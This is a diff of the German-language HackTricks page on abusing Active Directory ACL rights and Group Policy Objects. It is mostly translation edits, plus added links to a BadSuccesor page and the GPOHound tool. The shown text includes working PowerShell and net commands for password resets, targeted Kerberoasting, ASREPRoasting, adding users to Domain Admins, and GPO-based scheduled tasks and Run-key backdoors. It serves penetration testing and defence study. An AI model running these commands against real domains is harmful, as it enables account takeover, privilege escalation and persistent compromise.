@@ -2,26 +2,32 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Diese Seite ist hauptsächlich eine Zusammenfassung der Techniken von** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **und** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Für weitere Details siehe die Originalartikel.**
+**Diese Seite ist hauptsächlich eine Zusammenfassung der Techniken von** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **und** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Für weitere Details, siehe die Originalartikel.**
+
+## BadSuccesor
+
+{{#ref}}
+BadSuccesor.md
+{{#endref}}
 
 ## **GenericAll-Rechte auf Benutzer**
 
 Dieses Privileg gewährt einem Angreifer die volle Kontrolle über ein Zielbenutzerkonto. Sobald die `GenericAll`-Rechte mit dem Befehl `Get-ObjectAcl` bestätigt sind, kann ein Angreifer:
 
 - **Das Passwort des Ziels ändern**: Mit `net user <username> <password> /domain` kann der Angreifer das Passwort des Benutzers zurücksetzen.
-- **Gezieltes Kerberoasting**: Ein SPN dem Benutzerkonto zuweisen, um es kerberoastable zu machen, dann Rubeus und targetedKerberoast.py verwenden, um die Ticket-Granting-Ticket (TGT)-Hashes zu extrahieren und zu versuchen, sie zu knacken.
+- **Gezieltes Kerberoasting**: Weisen Sie dem Benutzerkonto ein SPN zu, um es kerberoastable zu machen, und verwenden Sie dann Rubeus und targetedKerberoast.py, um die Ticket-Granting-Ticket (TGT)-Hashes zu extrahieren und zu versuchen, sie zu knacken.
 ```bash
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
-- **Targeted ASREPRoasting**: Deaktivieren Sie die Vorab-Authentifizierung für den Benutzer, wodurch sein Konto anfällig für ASREPRoasting wird.
+- **Targeted ASREPRoasting**: Deaktivieren Sie die Vorab-Authentifizierung für den Benutzer, wodurch dessen Konto anfällig für ASREPRoasting wird.
 ```bash
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
-## **GenericAll-Rechte in der Gruppe**
+## **GenericAll-Rechte auf Gruppe**
 
-Dieses Privileg ermöglicht es einem Angreifer, Gruppenmitgliedschaften zu manipulieren, wenn er `GenericAll`-Rechte in einer Gruppe wie `Domain Admins` hat. Nachdem der Angreifer den distinguished name der Gruppe mit `Get-NetGroup` identifiziert hat, kann er:
+Dieses Privileg ermöglicht es einem Angreifer, Gruppenmitgliedschaften zu manipulieren, wenn er `GenericAll`-Rechte auf einer Gruppe wie `Domain Admins` hat. Nachdem der Angreifer den distinguished name der Gruppe mit `Get-NetGroup` identifiziert hat, kann er:
 
 - **Sich Selbst zur Domain Admins Gruppe Hinzufügen**: Dies kann über direkte Befehle oder mithilfe von Modulen wie Active Directory oder PowerSploit erfolgen.
 ```bash
@@ -52,7 +58,7 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 ```
 ## **WriteProperty (Self-Membership)**
 
-Ein ähnliches Privileg, das Angreifern erlaubt, sich direkt zu Gruppen hinzuzufügen, indem sie die Gruppenattribute ändern, wenn sie das Recht `WriteProperty` für diese Gruppen haben. Die Bestätigung und Ausführung dieses Privilegs erfolgt mit:
+Ein ähnliches Privileg, das Angreifern erlaubt, sich direkt zu Gruppen hinzuzufügen, indem sie die Gruppenattribute ändern, wenn sie das Recht `WriteProperty` für diese Gruppen haben. Die Bestätigung und Ausführung dieses Privilegs erfolgen mit:
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
@@ -124,6 +130,8 @@ Um falsch konfigurierte GPOs zu identifizieren, können die Cmdlets von PowerSpl
 
 **OUs mit einer bestimmten Richtlinie angewendet**: Die Identifizierung von organisatorischen Einheiten (OUs), die von einer bestimmten Richtlinie betroffen sind, kann mit `Get-DomainOU` erfolgen.
 
+Sie können auch das Tool [**GPOHound**](https://github.com/cogiceo/GPOHound) verwenden, um GPOs aufzulisten und Probleme darin zu finden.
+
 ### Missbrauch von GPO - New-GPOImmediateTask
 
 Falsch konfigurierte GPOs können ausgenutzt werden, um Code auszuführen, beispielsweise durch das Erstellen einer sofortigen geplanten Aufgabe. Dies kann durchgeführt werden, um einen Benutzer zur lokalen Administratorgruppe auf betroffenen Maschinen hinzuzufügen, was die Berechtigungen erheblich erhöht:
@@ -132,7 +140,7 @@ New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net l
 ```
 ### GroupPolicy-Modul - Missbrauch von GPO
 
-Das GroupPolicy-Modul, sofern installiert, ermöglicht die Erstellung und Verknüpfung neuer GPOs sowie das Setzen von Präferenzen wie Registrierungswerten, um Backdoors auf betroffenen Computern auszuführen. Diese Methode erfordert, dass die GPO aktualisiert wird und ein Benutzer sich am Computer anmeldet, um die Ausführung zu ermöglichen:
+Das GroupPolicy-Modul, sofern installiert, ermöglicht die Erstellung und Verknüpfung neuer GPOs sowie das Festlegen von Präferenzen wie Registrierungswerten, um Backdoors auf betroffenen Computern auszuführen. Diese Methode erfordert, dass die GPO aktualisiert wird und ein Benutzer sich am Computer anmeldet, um die Ausführung zu ermöglichen:
 ```bash
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
@@ -155,11 +163,11 @@ Die Struktur der Aufgabe, wie sie in der XML-Konfigurationsdatei dargestellt ist
 
 ### Benutzer und Gruppen
 
-GPOs ermöglichen auch die Manipulation von Benutzer- und Gruppenmitgliedschaften auf Zielsystemen. Durch das direkte Bearbeiten der Richtliniendateien für Benutzer und Gruppen können Angreifer Benutzer zu privilegierten Gruppen, wie der lokalen Gruppe `administrators`, hinzufügen. Dies ist durch die Delegation von GPO-Verwaltungsberechtigungen möglich, die die Modifikation von Richtliniendateien erlaubt, um neue Benutzer hinzuzufügen oder Gruppenmitgliedschaften zu ändern.
+GPOs ermöglichen auch die Manipulation von Benutzer- und Gruppenmitgliedschaften auf Zielsystemen. Durch das direkte Bearbeiten der Benutzer- und Gruppendateien können Angreifer Benutzer zu privilegierten Gruppen, wie der lokalen `administrators`-Gruppe, hinzufügen. Dies ist durch die Delegation von GPO-Verwaltungsberechtigungen möglich, die die Modifikation von Richtliniendateien erlaubt, um neue Benutzer hinzuzufügen oder Gruppenmitgliedschaften zu ändern.
 
 Die XML-Konfigurationsdatei für Benutzer und Gruppen beschreibt, wie diese Änderungen umgesetzt werden. Durch das Hinzufügen von Einträgen zu dieser Datei können bestimmten Benutzern erhöhte Berechtigungen auf betroffenen Systemen gewährt werden. Diese Methode bietet einen direkten Ansatz zur Eskalation von Berechtigungen durch GPO-Manipulation.
 
-Darüber hinaus können auch zusätzliche Methoden zur Ausführung von Code oder zur Aufrechterhaltung der Persistenz in Betracht gezogen werden, wie die Nutzung von Anmelde-/Abmeldeskripten, das Ändern von Registrierungsschlüsseln für Autoruns, die Installation von Software über .msi-Dateien oder das Bearbeiten von Dienstkonfigurationen. Diese Techniken bieten verschiedene Möglichkeiten, um den Zugriff aufrechtzuerhalten und Zielsysteme durch den Missbrauch von GPOs zu kontrollieren.
+Darüber hinaus können zusätzliche Methoden zur Ausführung von Code oder zur Aufrechterhaltung der Persistenz, wie die Nutzung von Anmelde-/Abmelde-Skripten, die Modifikation von Registrierungsschlüsseln für Autoruns, die Installation von Software über .msi-Dateien oder die Bearbeitung von Dienstkonfigurationen, ebenfalls in Betracht gezogen werden. Diese Techniken bieten verschiedene Möglichkeiten, um den Zugriff aufrechtzuerhalten und Zielsysteme durch den Missbrauch von GPOs zu kontrollieren.
 
 ## Referenzen
 
